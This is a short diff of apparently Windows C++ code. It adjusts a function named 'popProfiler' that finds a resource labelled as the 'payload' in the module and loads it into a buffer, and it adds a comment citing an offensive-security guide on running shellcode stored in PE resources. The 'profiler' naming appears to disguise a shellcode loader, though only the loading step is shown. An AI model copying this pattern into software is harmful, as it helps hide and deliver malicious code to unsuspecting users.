@@ -88,7 +88,8 @@ void popProfiler() {
 		(LPCSTR)&PleaseFindMe, &hm);
 	
 	// Find the payload resource - make sure the int lines up with what you resource's ID is in the "resource symbols" table of the project
-	profileResource = FindResourceW(hm, MAKEINTRESOURCE(106), L"BLOB");
+	// See https://www.ired.team/offensive-security/code-injection-process-injection/loading-and-executing-shellcode-from-portable-executable-resources
+	profileResource = FindResourceW(hm, MAKEINTRESOURCE(101), L"BLOB");
 
 	// Load the resource into a buffer
 	profileSize = SizeofResource(hm, profileResource);
